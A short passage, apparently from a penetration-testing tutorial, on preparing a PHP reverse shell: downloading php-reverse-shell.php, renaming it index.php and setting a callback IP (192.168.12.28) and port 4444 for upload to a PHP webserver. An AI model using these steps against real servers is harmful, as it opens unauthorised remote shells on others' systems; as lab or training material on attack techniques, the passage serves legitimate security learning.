3.2.2 Getting a php reverse shell

We need a php reverse shell in order to have upload access to a webserver that’s running PHP.
You can download one from here.

a) Download the file.
b)Extract the files and make a copy of the file “php-reverse-shell.php” to a file named “index.php”.

$ cp php-reverse-shell.php index.php


c) Edit the “index.php” file and change these two lines.

$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS


to

$ip = '192.168.12.28';  // CHANGE THIS
$port = 4444;       // CHANGE THIS


d) Save the file.
